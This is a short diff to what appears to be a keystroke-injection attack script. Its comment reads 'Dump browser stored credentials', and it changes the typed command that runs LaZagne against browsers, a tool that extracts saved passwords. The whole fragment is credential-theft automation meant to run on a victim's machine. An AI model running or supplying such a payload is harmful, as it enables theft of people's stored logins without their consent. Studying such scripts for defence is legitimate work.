@@ -4,5 +4,5 @@
 Dump browser stored credentials
 '
 
-paste_command ".\laZagne.exe browsers"
-xdotool key Return
+execute_command ".\laZagne.exe browsers"
+create_new_line
